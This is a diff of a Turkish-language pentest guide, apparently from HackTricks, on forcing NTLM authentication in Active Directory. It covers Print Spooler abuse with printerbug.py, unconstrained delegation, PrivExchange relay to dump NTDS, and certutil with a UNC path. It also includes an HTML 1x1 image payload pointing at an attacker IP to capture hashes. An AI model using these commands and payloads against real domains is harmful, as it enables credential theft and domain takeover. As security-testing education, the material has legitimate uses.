@@ -8,8 +8,8 @@
 
 ## Spooler Servisi İstismarı
 
-Eğer _**Print Spooler**_ servisi **etkinse**, bazı bilinen AD kimlik bilgilerini kullanarak Alan Denetleyicisi'nin yazıcı sunucusuna yeni yazdırma görevleri hakkında bir **güncelleme** **talep** edebilir ve sadece **bildirimi bazı sistemlere göndermesini** söyleyebilirsiniz.\
-Yazıcı, bildirimi rastgele sistemlere gönderdiğinde, o **sistem** ile **kimlik doğrulaması yapması** gerekir. Bu nedenle, bir saldırgan _**Print Spooler**_ servisini rastgele bir sistemle kimlik doğrulaması yapacak şekilde yönlendirebilir ve hizmet bu kimlik doğrulamasında **bilgisayar hesabını** **kullanacaktır**.
+Eğer _**Print Spooler**_ servisi **etkinse**, bazı bilinen AD kimlik bilgilerini kullanarak Alan Denetleyicisi'nin yazıcı sunucusuna yeni yazdırma işleri hakkında bir **güncelleme** **talep** edebilir ve sadece **bildirimi bazı sistemlere göndermesini** söyleyebilirsiniz.\
+Yazıcı bildirimi rastgele sistemlere gönderdiğinde, o **sistem** ile **kimlik doğrulaması yapması** gerekir. Bu nedenle, bir saldırgan _**Print Spooler**_ servisini rastgele bir sistemle kimlik doğrulaması yapacak şekilde yönlendirebilir ve hizmet bu kimlik doğrulamasında **bilgisayar hesabını** **kullanacaktır**.
 
 ### Alan üzerindeki Windows Sunucularını Bulma
 
@@ -41,17 +41,19 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Kısıtlanmamış Delegasyon ile Birleştirme
 
-Eğer bir saldırgan [Kısıtlanmamış Delegasyon](unconstrained-delegation.md) ile bir bilgisayarı ele geçirmişse, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Kısıtlanmamış delegasyon nedeniyle, **yazıcının bilgisayar hesabının TGT'si** kısıtlanmamış delegasyona sahip bilgisayarın **belleğinde** **saklanacaktır**. Saldırgan bu hostu zaten ele geçirdiği için, **bu bileti alabilecek** ve bunu kötüye kullanabilecektir ([Pass the Ticket](pass-the-ticket.md)).
+Eğer bir saldırgan [Kısıtlanmamış Delegasyon](unconstrained-delegation.md) ile bir bilgisayarı ele geçirmişse, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Kısıtlanmamış delegasyon nedeniyle, **yazıcının bilgisayar hesabının TGT'si** kısıtlanmamış delegasyona sahip bilgisayarın **belleğinde** **saklanacaktır**. Saldırgan bu ana bilgisayarı zaten ele geçirdiği için, **bu bileti alabilir** ve kötüye kullanabilir ([Pass the Ticket](pass-the-ticket.md)).
 
 ## RCP Zorla Kimlik Doğrulama
 
-{% embed url="https://github.com/p0dalirius/Coercer" %}
+{{#ref}}
+https://github.com/p0dalirius/Coercer
+{{#endref}}
 
 ## PrivExchange
 
-`PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir hatanın sonucudur. Bu özellik, herhangi bir posta kutusuna sahip alan kullanıcısının Exchange sunucusunu HTTP üzerinden herhangi bir istemci sağlanan hosta kimlik doğrulaması yapmaya zorlamasına olanak tanır.
+`PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir hatanın sonucudur. Bu özellik, Exchange sunucusunun, bir posta kutusuna sahip herhangi bir alan kullanıcısı tarafından HTTP üzerinden herhangi bir istemci sağlanan ana bilgisayara kimlik doğrulaması yapmasını zorlar.
 
-Varsayılan olarak, **Exchange servisi SYSTEM olarak çalışır** ve aşırı ayrıcalıklara sahiptir (özellikle, **2019 Öncesi Kümülatif Güncelleme'de alan üzerinde WriteDacl ayrıcalıklarına sahiptir**). Bu hata, **LDAP'ya bilgi iletimini sağlamak ve ardından alan NTDS veritabanını çıkarmak** için sömürülebilir. LDAP'ya iletim mümkün olmadığında bile, bu hata alan içindeki diğer hostlara iletim ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde sömürülmesi, herhangi bir kimlik doğrulaması yapılmış alan kullanıcı hesabıyla Alan Yöneticisi'ne anında erişim sağlar.
+Varsayılan olarak, **Exchange hizmeti SYSTEM olarak çalışır** ve aşırı ayrıcalıklara sahiptir (özellikle, **2019'dan önceki Kümülatif Güncelleme üzerinde WriteDacl ayrıcalıkları vardır**). Bu hata, **LDAP'ye bilgi iletimini sağlamak ve ardından alan NTDS veritabanını çıkarmak** için kullanılabilir. LDAP'ye iletim mümkün olmadığında bile, bu hata alan içindeki diğer ana bilgisayarlara iletim ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde kötüye kullanılması, herhangi bir kimlik doğrulaması yapılmış alan kullanıcı hesabıyla Alan Yöneticisi'ne anında erişim sağlar.
 
 ## Windows İçinde
 
@@ -86,7 +88,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### E-posta ile
 
-Eğer ele geçirmek istediğiniz bir makineye giriş yapan kullanıcının **e-posta adresini** biliyorsanız, ona **1x1 piksel boyutunda bir resim içeren bir e-posta** gönderebilirsiniz.
+Eğer ele geçirmek istediğiniz bir makineye giriş yapan kullanıcının **e-posta adresini** biliyorsanız, ona **1x1 piksel boyutunda bir resim** içeren bir **e-posta** gönderebilirsiniz.
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
